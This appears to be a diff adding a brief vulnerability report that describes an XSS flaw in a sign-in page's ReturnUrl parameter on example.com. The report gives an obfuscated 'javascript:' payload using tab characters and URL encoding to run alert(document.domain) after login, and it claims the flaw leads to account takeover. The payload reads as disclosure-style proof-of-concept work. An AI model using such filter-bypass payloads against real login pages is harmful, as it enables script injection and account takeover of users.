@@ -1,0 +1,7 @@
+1- https://www.example.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2eexample%2ecom%2f%250Aalert%2528document.domain%2529
+2-Login
+3-The JS will execute on users(victim) account.
+-Impact:
+---------
+lead to Account takeover .
+execute malicious javascript code
